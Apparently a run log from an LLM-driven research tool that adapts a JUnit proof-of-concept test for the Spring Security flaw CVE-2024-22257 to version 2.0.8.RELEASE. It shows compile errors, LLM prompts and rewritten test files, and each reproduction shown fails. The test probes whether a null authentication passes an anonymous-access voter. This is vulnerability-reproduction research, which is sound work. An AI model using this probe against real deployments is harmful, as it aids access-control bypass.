[ERROR]   symbol:   class AnonymousAuthenticationToken
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
[ERROR]   symbol:   variable AuthorityUtils
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 141 (prompt), 9 (completion), 150 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: package org.springframework.security.authentication does not exist, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code: import org.springframework.security.authentication.AnonymousAuthenticationToken; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.springframework.security.authentication;AnonymousAuthenticationToken
[96m[ErrorManager] Extracted key entities: ['org.springframework.security.authentication', 'AnonymousAuthenticationToken'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 11, 'column': 51, 'message': 'package org.springframework.security.authentication does not exist', 'symbol': None, 'location': None, 'code_line': 'import org.springframework.security.authentication.AnonymousAuthenticationToken;'} with cause: ['org.springframework.security.authentication', 'AnonymousAuthenticationToken'][0m
[96m[Adapter] Related diffs for error: [(633, 14.0), (1251, 8.0), (567, 4.0), (628, 4.0), (631, 4.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: package org.springframework.security.authentication does not exist | cause: ['org.springframework.security.authentication', 'AnonymousAuthenticationToken'][0m
[96m[RepairModule] Trying best diff #633 with score 14.00[0m
[LLMClient] Tokens used: 581 (prompt), 257 (completion), 838 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.0.8.RELEASE.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: package org.springframework.security.authentication does not exist, symble: None, location: None

### Error Position:
import org.springframework.security.authentication.AnonymousAuthenticationToken;

### Related Diff:
Operation: MODIFIED, File: core/src/main/java/org/springframework/security/authentication/AnonymousAuthenticationToken.java, Hunk: @@ -13,13 +13,14 @@
  * limitations under the License.
  */

+package org.springframework.security.providers.anonymous;
-package org.springframework.security.authentication;

+import org.springframework.security.GrantedAuthority;
-import org.springframework.security.core.GrantedAuthority;

+import org.springframework.security.providers.AbstractAuthenticationToken;

 import java.io.Serializable;
-import java.util.Arrays;
-import java.util.List;


 /**

### Test File Content:
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}



[LLMClient] Response: 
Here's the modified test file according to the diff:

```java
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method createList(java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class org.springframework.security.SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[92m[RepairModule] Error package org.springframework.security.authentication does not exist resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method createList(java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class org.springframework.security.SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2205 (prompt), 1 (completion), 2206 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
  symbol:   class Authentication
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol
  symbol:   method createList(java.lang.String)
  location: class org.springframework.security.SecurityConfig
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
  symbol:   variable AuthorityUtils
  location: class edu.vision.se.Testcase1
[INFO] 6 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.234 s
[INFO] Finished at: 2025-07-10T06:47:13Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
[ERROR]   symbol:   class Authentication
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol
[ERROR]   symbol:   method createList(java.lang.String)
[ERROR]   location: class org.springframework.security.SecurityConfig
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
[ERROR]   symbol:   variable AuthorityUtils
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 137 (prompt), 6 (completion), 143 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: package org.springframework.security.core does not exist, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code: import org.springframework.security.core.Authentication; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.springframework.security.core;Authentication
[96m[ErrorManager] Extracted key entities: ['org.springframework.security.core', 'Authentication'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 12, 'column': 41, 'message': 'package org.springframework.security.core does not exist', 'symbol': None, 'location': None, 'code_line': 'import org.springframework.security.core.Authentication;'} with cause: ['org.springframework.security.core', 'Authentication'][0m
[96m[Adapter] Related diffs for error: [(429, 10.0), (159, 8.0), (289, 8.0), (448, 8.0), (497, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: package org.springframework.security.core does not exist | cause: ['org.springframework.security.core', 'Authentication'][0m
[96m[RepairModule] Trying best diff #429 with score 10.00[0m
[LLMClient] Tokens used: 1616 (prompt), 259 (completion), 1875 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.0.8.RELEASE.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: package org.springframework.security.core does not exist, symble: None, location: None

### Error Position:
import org.springframework.security.core.Authentication;

### Related Diff:
Operation: NEW_FILE, File: core/src/main/java/org/springframework/security/Authentication.java, Hunk: @@ -1,106 +0,0 @@
+/* Copyright 2004, 2005, 2006 Acegi Technology Pty Limited
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.springframework.security;
+
+import java.io.Serializable;
+
+import java.security.Principal;
+
+
+/**
+ * Represents an authentication request.
+ *
+ * <p>
+ * An <code>Authentication</code> object is not considered authenticated until
+ * it is processed by an {@link AuthenticationManager}.
+ * </p>
+ *
+ * <p>
+ * Stored in a request {@link org.springframework.security.context.SecurityContext}.
+ * </p>
+ *
+ * @author Ben Alex
+ * @version $Id$
+ */
+public interface Authentication extends Principal, Serializable {
+    //~ Methods ========================================================================================================
+
+    /**
+     * Set by an <code>AuthenticationManager</code> to indicate the authorities that the principal has been
+     * granted. Note that classes should not rely on this value as being valid unless it has been set by a trusted
+     * <code>AuthenticationManager</code>.<p>Implementations should ensure that modifications to the returned
+     * array do not affect the state of the Authentication object (e.g. by returning an array copy).</p>
+     *
+     * @return the authorities granted to the principal, or <code>null</code> if authentication has not been completed
+     */
+    GrantedAuthority[] getAuthorities();
+
+    /**
+     * The credentials that prove the principal is correct. This is usually a password, but could be anything
+     * relevant to the <code>AuthenticationManager</code>. Callers are expected to populate the credentials.
+     *
+     * @return the credentials that prove the identity of the <code>Principal</code>
+     */
+    Object getCredentials();
+
+    /**
+     * Stores additional details about the authentication request. These might be an IP address, certificate
+     * serial number etc.
+     *
+     * @return additional details about the authentication request, or <code>null</code> if not used
+     */
+    Object getDetails();
+
+    /**
+     * The identity of the principal being authenticated. This is usually a username. Callers are expected to
+     * populate the principal.
+     *
+     * @return the <code>Principal</code> being authenticated
+     */
+    Object getPrincipal();
+
+    /**
+     * Used to indicate to <code>AbstractSecurityInterceptor</code> whether it should present the
+     * authentication token to the <code>AuthenticationManager</code>. Typically an <code>AuthenticationManager</code>
+     * (or, more often, one of its <code>AuthenticationProvider</code>s) will return an immutable authentication token
+     * after successful authentication, in which case that token can safely return <code>true</code> to this method.
+     * Returning <code>true</code> will improve performance, as calling the <code>AuthenticationManager</code> for
+     * every request will no longer be necessary.<p>For security reasons, implementations of this interface
+     * should be very careful about returning <code>true</code> to this method unless they are either immutable, or
+     * have some way of ensuring the properties have not been changed since original creation.</p>
+     *
+     * @return true if the token has been authenticated and the <code>AbstractSecurityInterceptor</code> does not need
+     *         to represent the token for re-authentication to the <code>AuthenticationManager</code>
+     */
+    boolean isAuthenticated();
+
+    /**
+     * See {@link #isAuthenticated()} for a full description.<p>Implementations should <b>always</b> allow this
+     * method to be called with a <code>false</code> parameter, as this is used by various classes to specify the
+     * authentication token should not be trusted. If an implementation wishes to reject an invocation with a
+     * <code>true</code> parameter (which would indicate the authentication token is trusted - a potential security
+     * risk) the implementation should throw an {@link IllegalArgumentException}.</p>
+     *
+     * @param isAuthenticated <code>true</code> if the token should be trusted (which may result in an exception) or
+     *        <code>false</code> if the token should not be trusted
+     *
+     * @throws IllegalArgumentException if an attempt to make the authentication token trusted (by passing

### Test File Content:
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method createList(java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class org.springframework.security.SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[92m[RepairModule] Error package org.springframework.security.core does not exist resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
